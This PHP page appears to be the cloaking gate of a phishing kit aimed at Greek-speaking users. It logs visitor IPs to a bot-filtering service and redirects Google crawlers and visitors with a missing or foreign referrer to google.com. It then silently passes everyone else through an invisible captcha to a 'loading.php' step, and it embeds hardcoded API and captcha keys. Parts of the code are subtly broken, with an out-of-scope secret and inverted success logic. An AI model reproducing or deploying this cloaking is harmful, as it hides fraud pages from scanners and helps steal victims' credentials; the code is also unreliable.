<?php
error_reporting(0);
function getUserIP43_CF() {
    $keys = ["REMOTE_ADDR", "HTTP_CLIENT_IP", "HTTP_X_FORWARDED_FOR", "HTTP_X_FORWARDED", "HTTP_FORWARDED_FOR", "HTTP_FORWARDED"];

    foreach ($keys as $key) {
        if (isset($_SERVER[$key]) and 
(filter_var($_SERVER[$key], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) || filter_var($_SERVER[$key], FILTER_VALIDATE_IP, FILTER_FLAG_IPV6))) {
            return $_SERVER[$key];
        }
    }
    return "UNKNOWN";
}
$ipCF43_CF = getUserIP43_CF(); 
if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') {$link20_CF = "https";}
else{$link20_CF = "http"; }
$link20_CF .= "://"; 
$link20_CF .= $_SERVER['HTTP_HOST']; 
$link20_CF .= $_SERVER['REQUEST_URI']; 
$url_CF23 = "https://api15648.cloudfilt.com/phpcurl";
$data_CF23 = array("ip" => $ipCF43_CF, "KEY" => "kTJy5E7gM3ZXMZFSz9DY", "URL" => $link20_CF);
$options_CF23 = array("http" => array(
	"header" => "Content-Type: application/x-www-form-urlencoded\r\n",
	"method"  => "POST",
	"content" => http_build_query($data_CF23),
	"timeout" => 1
));
$context_CF23  = stream_context_create($options_CF23);
$server67_CF = file_get_contents($url_CF23, false, $context_CF23);
if ($server67_CF != "OK" and !empty($server67_CF)) { header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");header("Cache-Control: post-check=0, pre-check=0", false);header("Pragma: no-cache"); header("Location: https://cloudfilt.com/stop-$ipCF43_CF-quOju7SWLwURXKmlOq34" , true, 307);echo "<SCRIPT LANGUAGE='JavaScript'>document.location.href='https://cloudfilt.com/stop-".$ipCF43_CF."-quOju7SWLwURXKmlOq34'</SCRIPT>";die;}
?>
<?php
error_reporting(0);
define("ANTIBOT_API", '8584c7b0ae67e1c6a86771e43dbd593a');
$captch_key = "6LdyDIYkAAAAAH3-39WW-ZqVIKRInWLCekoNoi9C";
$captch_secretkey = "6LdyDIYkAAAAAEe1PSCW7GjyK2OvpLQC5wT7AFfP";
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('Location: https://google.com'); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('Location: https://google.com'); }
$asva = $_SERVER['HTTP_HOST'] ?? "" ;
$ref = $_SERVER["HTTP_REFERER"] ?? "" ;
$check=parse_url($ref);
if($check['host'] !=$asva) { header('Location: https://google.com'); }
elseif($_SERVER['HTTP_REFERER'] == NULL){ header('Location: https://google.com'); }
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>...</title>
<meta name="multilanguage" content="true">
<meta name="lng" content="el">
<meta name="robots" content="noindex,nofollow,noimageindex,noarchive,nocache,nosnippet">
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" href="favicon.ico">
<script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback" async defer></script>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
<script>
var onloadCallback = function() {
    grecaptcha.execute();
};
function onLoad(token) {
    document.getElementById("i-recaptcha").submit();
};
</script>
<script async src="https://srv15648.cloudfilt.com/analyz.js?render=quOju7SWLwURXKmlOq34"></script>
<body>
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    function post_captcha($user_response) {
        $fields_string = '';
        $fields = array(
            'secret' => $captch_secretkey,
            'response' => $user_response
        );
        foreach($fields as $key=>$value)
        $fields_string .= $key . '=' . $value . '&';
        $fields_string = rtrim($fields_string, '&');
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api/siteverify');
        curl_setopt($ch, CURLOPT_POST, count($fields));
        curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, True);
        $result = curl_exec($ch);
        curl_close($ch);
        return json_decode($result, true);
    }
    $res = post_captcha($_POST['g-recaptcha-response']);
    if (!$res['success']) {
        echo 'Success';
    } else {
        echo 'Error';
    }
} else { 
}
?>
<form id='i-recaptcha' action="loading.php" method="post">
<button hidden="hidden" class="g-recaptcha" <?php echo"data-sitekey="."'".$captch_key."'" ?> data-callback="onLoad">
</button>
</form>
<div _ngcontent-tfk-c83="" class="ng-tns-c83-0">
    <center id="loading_1" style="padding: 100px;">
        <br>
        <br>
        <br>
        <spinner class="content-dgn-c104 ng-tns-c104-1">
            <br>
            <br>
            <br>
            <br>
            <img style="" src="ajax-loader-transparent.gif" width="69px">
        </spinner>
    </center>
</div>
</body>
</html>
<?php
?>